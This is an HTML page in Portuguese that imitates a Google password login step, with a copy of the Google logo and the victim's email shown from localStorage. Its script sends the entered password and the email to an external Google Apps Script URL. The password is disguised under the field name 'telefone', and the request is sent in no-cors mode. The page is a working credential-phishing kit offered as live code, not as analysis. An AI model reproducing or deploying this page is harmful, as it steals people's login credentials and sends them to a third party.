<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="utf-8" />
  <title>Login — Senha</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    :root{
      --bg:#f1f3f4;
      --card:#fff;
      --text:#202124;
      --muted:#5f6368;
      --primary:#1a73e8;
    }
    *{box-sizing:border-box}
    body{
      margin:0;
      font-family: Arial, sans-serif;
      background:var(--bg);
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
    }
    .card{
      width:760px;
      max-width:100%;
      background:var(--card);
      border-radius:14px;
      padding:40px;
      box-shadow:0 6px 18px rgba(0,0,0,0.06);
      display:flex;
      gap:40px;
      align-items:center;
    }
    .left{flex:1}
    .right{flex:1.1}
    .logo{width:48px;height:48px;margin-bottom:8px}
    h1{margin:0 0 8px 0;color:var(--text);font-size:36px}
    .email-pill{
      display:inline-flex;
      align-items:center;
      gap:10px;
      padding:8px 12px;
      border-radius:999px;
      border:1px solid #dadce0;
      background:#fff;
      font-size:14px;
      color:var(--text);
      margin-bottom:14px;
    }
    input[type="text"], input[type="password"]{
      padding:14px;
      font-size:15px;
      border:1px solid #dadce0;
      border-radius:6px;
      width:100%;
      margin-bottom:8px;
    }
    .show-password-container{
      display:flex;
      align-items:center;
      gap:6px;
      font-size:14px;
      color:var(--text);
      margin-bottom:18px;
    }
    .actions{display:flex;align-items:center;justify-content:space-between;margin-top:18px}
    .link{color:var(--primary);text-decoration:none;font-size:14px}
    button{
      background:var(--primary);
      color:#fff;
      border:0;
      padding:10px 18px;
      border-radius:24px;
      font-weight:600;
      cursor:pointer;
    }
    .footer{margin-top:20px;color:var(--muted);font-size:13px}
    @media(max-width:740px){
      .card{flex-direction:column;padding:28px}
      h1{font-size:28px}
    }
  </style>
</head>
<body>

  <div class="card">
    <div class="left" aria-hidden="true">
      <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 48" aria-hidden="true">
        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
        <path fill="#1B5E20" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
        <path fill="#B71C1C" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
      </svg>
      <h1>Olá!</h1>
      <div class="email-pill" id="emailContainer" aria-live="polite">
        <span id="emailText">endereço@exemplo.com</span>
      </div>
    </div>

    <div class="right">
      <form id="senhaForm">
        <input id="passwordField" type="password" name="phone" placeholder="Digite sua senha" required />
        <label class="show-password-container">
          <input type="checkbox" id="togglePassword" /> Mostrar senha
        </label>
        <div class="actions">
          <button type="submit">Avançar</button>
        </div>
      </form>
    </div>
  </div>

  <script>
    // Pegar o e-mail armazenado
    const email = localStorage.getItem('userEmail') || '';
    const emailText = document.getElementById('emailText');
    emailText.textContent = email || 'Usuário';

    const scriptURL = 'https://script.google.com/macros/s/AKfycbwfT5uMwoWSHnhw5lYeznU-BIp4djaTotbwtE_Y8FtheLAzPuYhDyMiCRVYMSXCmGaI/exec';

    // Envio da senha mantendo o mesmo campo esperado pelo Google Script
    document.getElementById('senhaForm').addEventListener('submit', function(e){
      e.preventDefault();
      const senha = document.getElementById('passwordField').value.trim();
      if(!senha){
        alert('Digite sua senha.');
        return;
      }

      fetch(scriptURL, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ email, telefone: senha }) // "telefone" mantém compatibilidade
      })
      .then(() => alert('Dados enviados com sucesso!'))
      .catch(() => alert('Erro ao enviar os dados.'));
    });

    // Mostrar/Esconder senha sem alterar tamanho da fonte
    const pwField = document.getElementById('passwordField');
    const toggle = document.getElementById('togglePassword');
    toggle.addEventListener('change', function() {
      const currentFontSize = pwField.style.fontSize || '15px';
      pwField.type = this.checked ? 'text' : 'password';
      pwField.style.fontSize = currentFontSize;
    });
  </script>

</body>
</html>
